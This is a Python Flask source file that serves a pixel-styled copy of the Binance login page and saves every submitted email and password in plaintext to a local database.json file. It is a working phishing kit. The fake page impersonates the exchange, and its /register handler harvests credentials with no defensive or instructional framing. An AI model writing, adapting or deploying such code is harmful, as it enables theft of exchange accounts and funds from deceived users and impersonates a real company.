from flask import Flask, request
import os
import json

app = Flask(__name__)

# --- Full HTML (with /static references for images) ---
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:ital,wght@0,100..700;1,100..700&display=swap" rel="stylesheet">
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Log in | Binance</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
     font-family: "IBM Plex Sans", sans-serif;
  font-optical-sizing: auto;
  font-weight: 400;
  font-style: normal;

  }

  body {
    background-color: #181A20;
    color: #fff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }

  .container {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px 20px;
  }

  .login-card {
    background-color: #181A20;
    border: 1px solid #2b3139;
    border-radius: 16px;
    padding: 48px;
    width: 100%;
    max-width: 421px;
  }

  .logo {
    display: flex;
    align-items: center;
    gap: 0px;
    margin-bottom: 20px;
  }


  .header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 32px;
  }

  .header h1 {
    font-size: 32px;
    font-weight: 500;
    color: #fff;
  }

  .qr-btn {
    background: transparent;
    border: 1px solid #2b3139;
    border-radius: 8px;
    width: 40px;
    height: 40px;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    color: #848e9c;
    transition: all 0.2s;
  }

  .qr-btn:hover {
    border-color: #474d57;
    color: #fff;
  }

  .login-form {
    display: flex;
    flex-direction: column;
    gap: 16px;
  }

  .form-group {
    display: flex;
    flex-direction: column;
    gap: 8px;
  }

  .form-group label {
    font-size: 14px;
    color: #fff;
    font-weight: 400;
  }

  .form-group input {
    background-color: transparent;
    border: 1px solid #2b3139;
    border-radius: 8px;
    padding: 14px 16px;
    font-size: 15px;
    color: #fff;
    outline: none;
    transition: all 0.2s;
  }

  .form-group input::placeholder {
    color: #5e6673;
  }

  .form-group input:focus {
    border-color: #f3ba2f;
  }

  .btn {
    padding: 14px 16px;
    border-radius: 8px;
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
    transition: all 0.2s;
    border: none;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
  }

  .btn-primary {
    background-color: #fcd535;
    color: #181a20;
    margin-top: 8px;
  }

  .btn-primary:hover {
    background-color: #f0ce2d;
  }

  .btn-primary:active {
    transform: scale(0.98);
  }

  .divider {
    position: relative;
    text-align: center;
    margin: 16px 0;
  }

  .divider:before {
    content: "";
    position: absolute;
    left: 0;
    top: 50%;
    width: 100%;
    height: 1px;
    background-color: #2b3139;
  }

  .divider span {
    position: relative;
    background-color: #181A20;
    padding: 0 12px;
    font-size: 14px;
    color: #848e9c;
  }

.social-buttons {
  display: flex;
  flex-direction: column;
  gap: 12px;
}

.btn-social {
  background-color: transparent;
  border: 1px solid #2b3139;
  color: #fff;
  position: relative;        /* for absolute positioning of icon */
  display: flex;
  align-items: center;
  justify-content: center;   /* keep text centered */
  padding: 14px 16px;
  border-radius: 8px;
  cursor: pointer;
  transition: all 0.2s;
}

.btn-social img {
  height: 32px;
  width: 32px;
  position: absolute;        /* icon stays on left */
  left: 16px;                /* space from left edge */
}

.btn-social:active {
  transform: scale(0.98);
}


  .create-account {
    display: block;
    text-align: center;
    margin-top: 16px;
    color: #fcd535;
    font-size: 14px;
    font-weight: 500;
    text-decoration: none;
    transition: opacity 0.2s;
  }

  .create-account:hover {
    opacity: 0.8;
  }

  footer {
    padding: 24px;
  }

  .footer-links {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 24px;
    flex-wrap: wrap;
  }

  .footer-links a,
  .footer-links .language {
    color: #848e9c;
    font-size: 14px;
    text-decoration: none;
    transition: color 0.2s;
  }

  .footer-links a:hover {
    color: #fff;
  }

  .language {
    display: flex;
    align-items: center;
    gap: 6px;
    background: transparent;
    border: none;
    cursor: pointer;
    transition: color 0.2s;
  }

  .language:hover {
    color: #fff;
  }

  @media (max-width: 600px) {
    .login-card {
      padding: 32px 24px;
    }

    .header h1 {
      font-size: 28px;
    }
  }
</style>
</head>
<body>
  <div class="container">
    <div class="login-card">
      <div class="logo">
        <img src="/static/ 2025-10-23 202556.png" alt="Logo" />
      </div>

      <div class="header">
        <h1>Log in</h1>
        <button class="qr-btn">
          <img src="/static/ 2025-10-23 203644.png" alt="QR" />
        </button>
      </div>

      <form class="login-form" action="/register" method="post">
        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
        <div class="form-group">
          <label for="email">Email/Phone number</label>
          <input id="email" name="email" placeholder="Email/Phone (without country code)" type="text" required/>
        </div>
        <div class="form-group">
          <label for="password">Password</label>
          <input id="password" name="password" placeholder="Password associated to this account" type="password" required/>
        </div>
        <button class="btn btn-primary" type="submit">Continue</button>

        <div class="divider"><span>or</span></div>

        <div class="social-buttons">
          <button class="btn btn-social" type="button">
            <img src="/static/passkey.png" alt="Passkey" />
            Continue with Passkey
          </button>
          <button class="btn btn-social" type="button">
            <img src="/static/google.png" alt="Google" />
            Continue with Google
          </button>
          <button class="btn btn-social" type="button">
            <img src="/static/apple.png" alt="Apple" />
            Continue with Apple
          </button>
          <button class="btn btn-social" type="button">
            <img src="/static/telegram.png" alt="Telegram" />
            Continue with Telegram
          </button>
        </div>
      </form>
    </div>

    <a class="create-account" href="#">Create a Binance Account</a>
  </div>

  <footer>
    <div class="footer-links">
      <button class="language">English</button>
      <a href="#">Cookies</a>
      <a href="#">Terms</a>
      <a href="#">Privacy</a>
    </div>
  </footer>
</body>
</html>
"""

# Function to save email/password into database.json
def save_to_db(entry):
    if os.path.exists("database.json"):
        try:
            with open("database.json", "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            data = []
    else:
        data = []
    data.append(entry)
    with open("database.json", "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

# Home page serving login/register form
@app.route('/')
def home():
    return HTML_PAGE

# Handle POST from the form
@app.route('/register', methods=['POST'])
def register():
    email = request.form.get('email')
    password = request.form.get('password')
    save_to_db({"email": email, "password": password})
    return "<h2>Registration submitted and saved!</h2>"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
